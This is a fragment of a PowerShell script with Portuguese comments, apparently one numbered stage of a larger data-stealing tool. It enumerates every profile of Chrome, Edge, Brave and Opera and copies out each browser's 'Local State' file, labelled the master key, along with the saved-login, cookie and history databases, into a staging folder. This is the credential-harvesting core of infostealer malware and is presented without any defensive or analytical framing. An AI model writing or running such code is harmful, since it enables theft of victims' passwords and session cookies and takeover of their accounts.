# [3. NAVEGADORES (CHROME, EDGE, BRAVE, OPERA) - TODOS OS PERFIS]
$browsers = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data",
    "$env:APPDATA\Opera Software\Opera Stable"
)
$b_dir = "$t_dir\Browsers"
New-Item -ItemType Directory -Force -Path $b_dir | Out-Null

foreach ($b in $browsers) {
    if (Test-Path $b) {
        $b_name = Split-Path $b -Leaf
        # Pega o Local State (Chave Mestra)
        if (Test-Path "$b\Local State") { Copy-Item -Path "$b\Local State" -Destination "$b_dir\${b_name}_LocalState.json" -ErrorAction SilentlyContinue }
        
        # Varre todos os perfis (Default, Profile 1, Profile 2...)
        Get-ChildItem -Path $b -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "Default|Profile" } | ForEach-Object {
            $prof = $_.Name
            $dest_prof = "$b_dir\${b_name}_$prof"
            New-Item -ItemType Directory -Force -Path $dest_prof | Out-Null
            
            if (Test-Path "$($_.FullName)\Network\Cookies") { Copy-Item -Path "$($_.FullName)\Network\Cookies" -Destination "$dest_prof\Cookies.db" -ErrorAction SilentlyContinue }
            if (Test-Path "$($_.FullName)\Login Data") { Copy-Item -Path "$($_.FullName)\Login Data" -Destination "$dest_prof\Logins.db" -ErrorAction SilentlyContinue }
            if (Test-Path "$($_.FullName)\History") { Copy-Item -Path "$($_.FullName)\History" -Destination "$dest_prof\History.db" -ErrorAction SilentlyContinue }
        }
    }
}
